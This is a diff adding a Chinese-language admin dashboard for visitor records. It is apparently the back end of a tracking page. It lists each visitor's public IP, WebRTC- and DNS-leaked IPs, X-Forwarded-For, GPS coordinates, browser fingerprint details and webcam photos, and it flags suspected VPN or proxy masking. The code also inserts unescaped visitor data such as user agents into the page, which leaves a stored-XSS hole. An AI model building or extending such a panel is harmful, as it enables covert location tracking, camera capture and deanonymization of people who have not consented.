@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>后台 · 访问记录</title>
+<style>
+  :root { color-scheme: light dark; }
+  * { box-sizing: border-box; }
+  body { font-family: system-ui, -apple-system, "Segoe UI", Roboto, "PingFang SC", "Microsoft YaHei", sans-serif; margin:0; background:#f5f7fb; color:#111827; font-size:14px; }
+  header { background:#1e293b; color:#fff; padding:14px 22px; display:flex; gap:16px; align-items:center; }
+  header h1 { font-size:16px; margin:0; font-weight:600; }
+  .container { display:flex; gap:16px; padding:16px; max-width:1280px; margin:0 auto; }
+  .col-main { flex:3; }
+  .col-side { flex:2; min-width:320px; }
+  .card { background:#fff; border:1px solid #e3e8f0; border-radius:10px; padding:14px 16px; margin-bottom:14px; box-shadow:0 1px 2px rgba(0,0,0,.04); }
+  .toolbar { display:flex; gap:8px; flex-wrap:wrap; align-items:end; }
+  label { font-size:12px; color:#6b7280; display:block; margin-bottom:2px; }
+  input[type=text], input[type=date] { font:inherit; border:1px solid #d1d5db; border-radius:6px; padding:6px 8px; }
+  button { font:inherit; border:0; background:#4f46e5; color:#fff; padding:7px 14px; border-radius:6px; cursor:pointer; }
+  button.ghost { background:#e5e7eb; color:#374151; }
+  table { width:100%; border-collapse:collapse; }
+  th, td { text-align:left; padding:7px 8px; border-bottom:1px solid #eef1f6; vertical-align:top; }
+  th { font-size:12px; color:#6b7280; font-weight:600; position:sticky; top:0; background:#fff; }
+  tr.clickable { cursor:pointer; }
+  tr.clickable:hover { background:#f0f4ff; }
+  tr.active { background:#e0e7ff; }
+  .pill { font-family:ui-monospace,SFMono-Regular,Menlo,monospace; background:#eef2ff; color:#3730a3; padding:1px 6px; border-radius:5px; font-size:11px; word-break:break-all; }
+  .small { font-size:11px; color:#6b7280; }
+  .tag { font-size:11px; padding:1px 7px; border-radius:999px; background:#e5e7eb; color:#374151; }
+  .tag.warn { background:#fef3c7; color:#92400e; }
+  .tag.ok { background:#dcfce7; color:#166534; }
+  .mismatch { background:#fef3c7 !important; color:#92400e !important; }
+  .empty { color:#9ca3af; text-align:center; padding:30px 0; }
+  .grid2 { display:grid; grid-template-columns:1fr 1fr; gap:8px 18px; }
+  img.photo { width:100%; max-width:300px; border-radius:8px; }
+  a { color:#4f46e5; }
+</style>
+</head>
+<body>
+<header>
+  <h1>访问记录后台</h1>
+  <span style="flex:1"></span>
+  <button class="ghost" onclick="load()">刷新</button>
+</header>
+
+<div class="container">
+  <div class="col-main">
+    <div class="card">
+      <div class="toolbar">
+        <div><label>起始日期</label><input type="date" id="from"></div>
+        <div><label>结束日期</label><input type="date" id="to"></div>
+        <div style="flex:1;min-width:160px"><label>IP / 会话 / 关键字</label><input type="text" id="ip" placeholder="如 1.2.3.4 或会话ID" style="width:100%"></div>
+        <button onclick="load()">查询</button>
+        <button class="ghost" onclick="reset()">重置</button>
+      </div>
+    </div>
+    <div class="card">
+      <table>
+        <thead>
+          <tr>
+            <th>时间</th><th>公网IP</th><th>WebRTC</th><th>DNS解析</th><th>第三方</th><th>定位</th><th>照片</th>
+          </tr>
+        </thead>
+        <tbody id="rows"><tr><td colspan="7" class="empty">加载中…</td></tr></tbody>
+      </table>
+      <div class="small" style="margin-top:8px" id="pageInfo"></div>
+    </div>
+  </div>
+
+  <div class="col-side">
+    <div class="card">
+      <h2 style="font-size:14px;margin:0 0 10px">用户详情</h2>
+      <div id="detail"><div class="empty">选择左侧记录查看</div></div>
+    </div>
+  </div>
+</div>
+
+<script>
+(() => {
+  "use strict";
+  const $ = id => document.getElementById(id);
+  let activeSession = null;
+
+  async function load() {
+    const p = new URLSearchParams();
+    if ($("from").value) p.set("from", $("from").value);
+    if ($("to").value) p.set("to", $("to").value);
+    if ($("ip").value) p.set("ip", $("ip").value);
+    p.set("page", 1);
+    p.set("per_page", 200);
+    const r = await fetch("/api/admin/records?" + p);
+    const j = await r.json();
+    render(j.records || [], j.total || 0);
+  }
+
+  function render(records, total) {
+    const tbody = $("rows");
+    if (!records.length) {
+      tbody.innerHTML = `<tr><td colspan="7" class="empty">无记录</td></tr>`;
+      $("pageInfo").textContent = "";
+      return;
+    }
+    tbody.innerHTML = records.map(r => {
+      const t = new Date(r.created_at).toLocaleString();
+      const loc = (r.latitude || r.longitude) ? `${r.latitude.toFixed(4)}, ${r.longitude.toFixed(4)}` : "—";
+      const photo = r.has_photo ? `<a href="${r.photo_url}" target="_blank"><span class="tag ok">有</span></a>` : `<span class="tag">无</span>`;
+      const mismatch = isMismatch(r) ? "mismatch" : "";
+      return `<tr class="clickable ${r.session_id===activeSession?'active':''}" onclick="selectRow('${r.session_id}')">
+        <td class="small">${t}</td>
+        <td><span class="pill ${mismatch}">${r.public_ip||'—'}</span></td>
+        <td class="small">${(r.webrtc_ips||[]).join('<br>')||'—'}</td>
+        <td class="small">${(r.resolver_ips||[]).join('<br>')||'—'}</td>
+        <td class="small">${(r.external_ips||[]).join('<br>')||'—'}</td>
+        <td class="small">${loc}</td>
+        <td>${photo}</td>
+      </tr>`;
+    }).join("");
+    $("pageInfo").textContent = `共 ${total} 条记录（显示最近 ${records.length} 条）`;
+  }
+
+  // 简单的伪装检测：公网IP 与任一第三方IP 不一致则标记
+  function isMismatch(r) {
+    const pub = (r.public_ip||"").trim();
+    if (!pub) return false;
+    const ext = r.external_ips || [];
+    const webrtc = r.webrtc_ips || [];
+    // 第三方IP 与公网IP 全部不同 → 疑似伪装
+    if (ext.length && !ext.includes(pub)) return true;
+    // WebRTC 出现公网IP 之外的真实IPv4 → 疑似
+    const realWebrtc = webrtc.filter(ip => ip && !ip.endsWith(".local") && ip.includes("."));
+    if (realWebrtc.length && !realWebrtc.includes(pub)) return true;
+    return false;
+  }
+
+  window.selectRow = async (sid) => {
+    activeSession = sid;
+    load();
+    const r = await fetch("/api/admin/records/" + encodeURIComponent(sid));
+    const j = await r.json();
+    const t = (x) => x ? new Date(x).toLocaleString() : "—";
+    const warn = isMismatch(j) ? `<span class="tag warn">疑似IP伪装</span>` : `<span class="tag ok">IP一致</span>`;
+    $("detail").innerHTML = `
+      <div class="grid2">
+        <div><div class="small">会话ID</div><span class="pill">${j.session_id}</span></div>
+        <div><div class="small">创建时间</div>${t(j.created_at)}</div>
+        <div><div class="small">公网IP（服务器视角）</div><span class="pill">${j.public_ip||'—'}</span></div>
+        <div><div class="small">X-Forwarded-For</div><span class="pill">${j.x_forwarded_for||'—'}</span></div>
+        <div><div class="small">WebRTC 本地IP</div>${(j.webrtc_ips||[]).map(x=>`<span class="pill">${x}</span>`).join(' ')||'—'}</div>
+        <div><div class="small">DNS解析路径IP</div>${(j.resolver_ips||[]).map(x=>`<span class="pill">${x}</span>`).join(' ')||'—'}</div>
+        <div><div class="small">第三方回溯IP</div>${(j.external_ips||[]).map(x=>`<span class="pill">${x}</span>`).join(' ')||'—'}</div>
+        <div><div class="small">伪装判定</div>${warn}</div>
+        <div><div class="small">定位</div>${(j.latitude||j.longitude)?`${j.latitude}, ${j.longitude} (±${j.location_acc?Math.round(j.location_acc):0}m)`:'—'} ${j.location_error?`<span class="tag warn">${j.location_error}</span>`:''}</div>
+        <div><div class="small">UA</div><span class="small">${j.user_agent||'—'}</span></div>
+        <div><div class="small">语言/时区</div>${j.language||'—'} / ${j.timezone||'—'}</div>
+        <div><div class="small">屏幕</div>${j.screen||'—'}</div>
+        <div><div class="small">DNS Token</div><span class="pill">${j.dns_token||'—'}</span></div>
+      </div>
+      ${j.has_photo ? `<div style="margin-top:10px"><div class="small">摄像头照片</div><img class="photo" src="${j.photo_url}"></div>` : '<div class="small" style="margin-top:10px">无照片</div>'}
+    `;
+  };
+
+  window.reset = () => {
+    $("from").value = ""; $("to").value = ""; $("ip").value = "";
+    load();
+  };
+
+  load();
+})();
+</script>
+</body>
+</html>
